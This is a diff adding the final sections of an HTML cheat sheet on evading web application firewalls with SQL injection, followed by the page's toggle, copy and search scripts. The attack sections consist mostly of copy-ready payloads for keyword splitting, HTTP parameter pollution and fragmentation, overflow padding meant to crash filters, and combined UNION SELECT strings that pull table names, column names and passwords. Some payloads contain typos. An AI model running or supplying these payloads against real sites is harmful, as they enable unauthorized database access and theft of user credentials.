+                    <code>-- @ for variables<br />
+                    select @^1.from users;   -- User variable<br />
+                    select @@version;        -- System variable</code>
+                </div>
+                <div class="code-block">
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    <code>-- Omit AS and spaces<br />
+                    select count(id)test from users;</code>
+                </div>
+
+                <h3 style="color:var(--accent-blue);font-size:16px;margin:12px 0 8px;">Keyword Splitting:</h3>
+                <div class="code-block">
+                    <code>se' + 'le' + 'ct</code>
+                </div>
+                <div class="code-block">
+                    <code>%5E%L%E%C%T</code>
+                </div>
+                <div class="code-block">
+                    <code>id=1+(Unl)(oN)+(SeL)(ECT)</code>
+                </div>
+
+                <div class="highlight-box">
+                    <strong>Advanced Operators:</strong>
+                    <code>&gt;&gt;, &lt;&lt;, &gt;=, &lt;=, &lt;&gt;, &lt;=&gt;, XOR, DIV, SOUNDS LIKE, RLIKE, REGEXP, IS, NOT, BETWEEN</code>
+                </div>
+            </div>
+        </section>
+
+        <!-- ════════════════════════════════════════════
+        SECTION g – HTTP Parameter Control
+        ════════════════════════════════════════════ -->
+        <section class="section" id="section-params">
+            <div class="section-header" onclick="toggleSection(this)">
+                <span class="icon">🌐</span>
+                <h2>g) HTTP Parameter Control</h2>
+                <span class="toggle">▼</span>
+            </div>
+            <div class="section-body open">
+                <p>
+                    Manipulate parameters, methods, and headers to cause <strong>WAF‑backend parsing discrepancies</strong>.
+                </p>
+
+                <h3 style="color:var(--accent-blue);font-size:16px;margin:12px 0 8px;">1. HPP (HTTP Parameter Pollution)</h3>
+                <div class="code-block">
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    <code>/?id=1;select+1,2,3+from+users+where+id=1—<br />
+                    /?id=1;select+1&amp;id=2,3+from+users+where+id=1—<br />
+                    /?id=1/*/union/&amp;id=/select/&amp;id=/pwd/&amp;id=/from/&amp;id=*/users</code>
+                </div>
+
+                <div class="table-wrap">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Web Server</th>
+                                <th>Handling</th>
+                                <th>Result</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr><td>ASP.NET / IIS</td><td>Concatenate with comma</td><td><code>par1=val1,val2</code></td></tr>
+                            <tr><td>ASP / IIS</td><td>Concatenate with comma</td><td><code>par1=val1,val2</code></td></tr>
+                            <tr><td>PHP / Apache</td><td>Last wins</td><td><code>par1=val2</code></td></tr>
+                            <tr><td>JSP / Tomcat</td><td>First wins</td><td><code>par1=val1</code></td></tr>
+                            <tr><td>Perl / Apache</td><td>First wins</td><td><code>par1=val1</code></td></tr>
+                            <tr><td>DBMan</td><td>Two tildes</td><td><code>par1=val1~val2</code></td></tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <h3 style="color:var(--accent-blue);font-size:16px;margin:12px 0 8px;">2. HPF (HTTP Parameter Fragment)</h3>
+                <div class="code-block">
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    <code>/?a=1+union/&amp;b=/select+1,pass/&amp;c=/from+users--</code>
+                </div>
+                <div class="code-block">
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    <code>-- Assembled:<br />
+                    select * from table where a=1 union/* and b=*/select 1,pass/limit */from users--</code>
+                </div>
+
+                <h3 style="color:var(--accent-blue);font-size:16px;margin:12px 0 8px;">3. HPC (HTTP Parameter Contamination)</h3>
+                <p>
+                    Leverage RFC 2396 special characters (<code>%</code>, <code>{</code>, <code>}</code>, etc.).
+                    ASP/ASP.NET are especially sensitive to <code>%</code>.
+                </p>
+            </div>
+        </section>
+
+        <!-- ════════════════════════════════════════════
+        SECTION h – Buffer Overflow
+        ════════════════════════════════════════════ -->
+        <section class="section" id="section-buffer">
+            <div class="section-header" onclick="toggleSection(this)">
+                <span class="icon">💥</span>
+                <h2>h) Buffer Overflow (Advanced)</h2>
+                <span class="toggle">▼</span>
+            </div>
+            <div class="section-body open">
+                <p>
+                    Many WAFs are written in C and <strong>lack overflow protection</strong>.
+                    A long payload can crash the filter.
+                </p>
+
+                <div class="code-block">
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    <code>?id=1 and (select 1)=(Select 0xA*1000)+UnloN+SeLeCT+1,2,version(),4,5,databasel,user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26</code>
+                </div>
+
+                <div class="highlight-box warning">
+                    <strong>💡 0xA*1000</strong> = 0xA followed by 1000 'A's. Adjust length per target.
+                </div>
+            </div>
+        </section>
+
+        <!-- ════════════════════════════════════════════
+        SECTION i – Integrated Bypass
+        ════════════════════════════════════════════ -->
+        <section class="section" id="section-integrated">
+            <div class="section-header" onclick="toggleSection(this)">
+                <span class="icon">🧩</span>
+                <h2>i) Integrated Bypass</h2>
+                <span class="toggle">▼</span>
+            </div>
+            <div class="section-body open">
+                <p>
+                    Combining multiple techniques <strong>drastically raises success rates</strong>.
+                    Some powerful combos are:
+                </p>
+
+                <div class="highlight-box success">
+                    <strong>🧩 Combo 1 – Encoding + Comments + Padding</strong>
+                    <div class="code-block" style="margin-top:8px;">
+                        <code>z.com/index.php?page_id=15+and+（select 1）=（Select 0xAA[..（add about 1000 "A"..]）/*!uNION*//*!SeLECT*/+1,2,3,4..</code>
+                    </div>
+                </div>
+
+                <div class="highlight-box success">
+                    <strong>🧩 Combo 2 – Inline Comments + Hex</strong>
+                    <div class="code-block" style="margin-top:8px;">
+                        <code>id=1/*!uNION*/+SeLECT+1,2,concat（/*!table_name*/)+FrOM/*!information_schema*/_tables/*!WHERE*/+/*!TaB1E_SCHeMa*/+1ike+database()--</code>
+                    </div>
+                </div>
+
+                <div class="highlight-box success">
+                    <strong>🧩 Combo 3 – Comments + Hexadecimal Table Name</strong>
+                    <div class="code-block" style="margin-top:8px;">
+                        <code>id=-725+/*!UNION*/+/*!SELECT*/+1,GrOUp_ConCaT（COLUMN_NAME）,3,4,5+FROM+/*!INFORMATIO N_SCHEM*/_COLUMNS+WHERE+TABLE_NAME=0x41646d696e</code>
+                    </div>
+                </div>
+
+                <div class="highlight-box warning">
+                    <strong>🎯 Final Takeaway:</strong>
+                    No single technique works universally. The core of SQL injection evasion lies in <strong>understanding how each component interacts with the parser</strong> and creatively combining these methods to defeat blacklist-based signatures.
+                </div>
+            </div>
+        </section>
+
+        <!-- ── FOOTER ── -->
+        <footer class="footer">
+            <p>
+                SQL Injection Bypass Techniques – WAF Evasion<br />
+                <span style="font-size:12px;color:var(--text-muted);">
+                    9 Core Methods · From Basic to Advanced · Complete Reference
+                </span>
+            </p>
+            <p style="margin-top:12px;font-size:14px;color:var(--text-secondary);">
+                🔗 Connect with me on <a href="https://www.linkedin.com/in/ahmedjumani/" target="_blank" rel="noopener noreferrer" style="color:var(--accent-blue);font-weight:600;">LinkedIn</a>
+            </p>
+        </footer>
+
+    </div>
+
+    <!-- ── BACK TO TOP ── -->
+    <button class="back-to-top" id="backToTop" title="Back to top">↑</button>
+
+    <!-- ── SCRIPTS ── -->
+    <script>
+        (function() {
+
+            // ── SECTION TOGGLE ──
+            window.toggleSection = function(headerEl) {
+                const body = headerEl.parentElement.querySelector('.section-body');
+                const toggle = headerEl.querySelector('.toggle');
+                if (!body) return;
+
+                if (body.classList.contains('open')) {
+                    body.classList.remove('open');
+                    body.classList.add('collapsed');
+                    if (toggle) toggle.classList.add('collapsed');
+                } else {
+                    body.classList.remove('collapsed');
+                    body.classList.add('open');
+                    if (toggle) toggle.classList.remove('collapsed');
+                }
+            };
+
+            // ── TOC NAVIGATION ──
+            document.querySelectorAll('.toc-item').forEach(item => {
+                item.addEventListener('click', function() {
+                    const targetId = this.dataset.target;
+                    const target = document.getElementById(targetId);
+                    if (target) {
+                        target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+                        // Expand the section if collapsed
+                        const body = target.querySelector('.section-body');
+                        const toggle = target.querySelector('.toggle');
+                        if (body && body.classList.contains('collapsed')) {
+                            body.classList.remove('collapsed');
+                            body.classList.add('open');
+                            if (toggle) toggle.classList.remove('collapsed');
+                        }
+                    }
+                });
+            });
+
+            // ── COPY CODE ──
+            window.copyCode = function(btn) {
+                const block = btn.closest('.code-block');
+                if (!block) return;
+                const codeEl = block.querySelector('code');
+                if (!codeEl) return;
+
+                const text = codeEl.textContent;
+                navigator.clipboard.writeText(text).then(() => {
+                    btn.textContent = '✓ Copied!';
+                    btn.classList.add('copied');
+                    setTimeout(() => {
+                        btn.textContent = 'Copy';
+                        btn.classList.remove('copied');
+                    }, 2000);
+                }).catch(() => {
+                    // fallback
+                    const range = document.createRange();
+                    range.selectNode(codeEl);
+                    window.getSelection().removeAllRanges();
+                    window.getSelection().addRange(range);
+                    document.execCommand('copy');
+                    btn.textContent = '✓ Copied!';
+                    btn.classList.add('copied');
+                    setTimeout(() => {
+                        btn.textContent = 'Copy';
+                        btn.classList.remove('copied');
+                    }, 2000);
+                });
+            };
+
+            // ── BACK TO TOP ──
+            const backBtn = document.getElementById('backToTop');
+            window.addEventListener('scroll', function() {
+                if (window.scrollY > 400) {
+                    backBtn.classList.add('visible');
+                } else {
+                    backBtn.classList.remove('visible');
+                }
+            });
+            backBtn.addEventListener('click', function() {
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            });
+
+            // ── SEARCH ──
+            const searchInput = document.getElementById('searchInput');
+            const clearBtn = document.getElementById('clearSearch');
+
+            function performSearch(query) {
+                const sections = document.querySelectorAll('.section');
+                const normalized = query.toLowerCase().trim();
+
+                sections.forEach(section => {
+                    const text = section.textContent.toLowerCase();
+                    const body = section.querySelector('.section-body');
+                    const header = section.querySelector('.section-header h2');
+
+                    if (normalized === '') {
+                        section.style.display = '';
+                        // Remove highlights
+                        const highlighted = section.querySelectorAll('.highlight-match');
+                        highlighted.forEach(el => {
+                            const parent = el.parentNode;
+                            parent.replaceChild(document.createTextNode(el.textContent), el);
+                            parent.normalize();
+                        });
+                        return;
+                    }
+
+                    if (text.includes(normalized)) {
+                        section.style.display = '';
+                        // Expand if collapsed
+                        if (body && body.classList.contains('collapsed')) {
+                            body.classList.remove('collapsed');
+                            body.classList.add('open');
+                            const toggle = section.querySelector('.toggle');
+                            if (toggle) toggle.classList.remove('collapsed');
+                        }
+                        // Highlight matches in the section
+                        highlightMatches(section, normalized);
+                    } else {
+                        section.style.display = 'none';
+                    }
+                });
+            }
+
+            function highlightMatches(section, query) {
+                // Remove existing highlights
+                const existing = section.querySelectorAll('.highlight-match');
+                existing.forEach(el => {
+                    const parent = el.parentNode;
+                    parent.replaceChild(document.createTextNode(el.textContent), el);
+                    parent.normalize();
+                });
+
+                // Walk text nodes and highlight
+                const walker = document.createTreeWalker(
+                    section,
+                    NodeFilter.SHOW_TEXT,
+                    {
+                        acceptNode: function(node) {
+                            // Skip nodes inside code blocks, scripts, or existing highlights
+                            if (node.parentElement.closest('.code-block')) return NodeFilter.FILTER_REJECT;
+                            if (node.parentElement.closest('script')) return NodeFilter.FILTER_REJECT;
+                            if (node.parentElement.classList.contains('highlight-match')) return NodeFilter.FILTER_REJECT;
+                            return NodeFilter.FILTER_ACCEPT;
+                        }
+                    }
+                );
+
+                const textNodes = [];
+                let node;
+                while (node = walker.nextNode()) {
+                    textNodes.push(node);
+                }
+
+                textNodes.forEach(textNode => {
+                    const text = textNode.textContent;
+                    const lower = text.toLowerCase();
+                    const index = lower.indexOf(query);
+                    if (index !== -1) {
+                        const fragment = document.createDocumentFragment();
+                        const before = text.substring(0, index);
+                        const match = text.substring(index, index + query.length);
+                        const after = text.substring(index + query.length);
+
+                        if (before) {
+                            fragment.appendChild(document.createTextNode(before));
+                        }
+                        const span = document.createElement('span');
+                        span.className = 'highlight-match';
+                        span.textContent = match;
+                        fragment.appendChild(span);
+                        if (after) {
+                            fragment.appendChild(document.createTextNode(after));
+                        }
+                        textNode.parentNode.replaceChild(fragment, textNode);
+                    }
+                });
+            }
+
+            searchInput.addEventListener('input', function() {
+                const val = this.value;
+                if (val.length > 0) {
+                    clearBtn.classList.add('visible');
+                } else {
+                    clearBtn.classList.remove('visible');
+                }
+                performSearch(val);
+            });
+
+            clearBtn.addEventListener('click', function() {
+                searchInput.value = '';
+                clearBtn.classList.remove('visible');
+                performSearch('');
+            });
+
+            // ── KEYBOARD SHORTCUT: Ctrl+F / Cmd+F focuses search ──
+            document.addEventListener('keydown', function(e) {
+                if ((e.ctrlKey || e.metaKey) && e.key === 'f') {
+                    // Let browser handle default find, but also focus our search
+                    setTimeout(() => {
+                        searchInput.focus();
+                        searchInput.select();
+                    }, 10);
+                }
+                if (e.key === 'Escape') {
+                    searchInput.blur();
+                }
+            });
+
+            // ── AUTO-EXPAND SECTIONS WITH CONTENT ON LOAD ──
+            // (All sections start open, so nothing needed)
+
+            console.log('🔍 SQLi Bypass Techniques — WAF Evasion');
+            console.log('📄 9 Core Methods · Complete Reference');
+            console.log('💡 Use the search bar to find specific techniques.');
+
+        })();
+    </script>
+
+</body>
+</html>
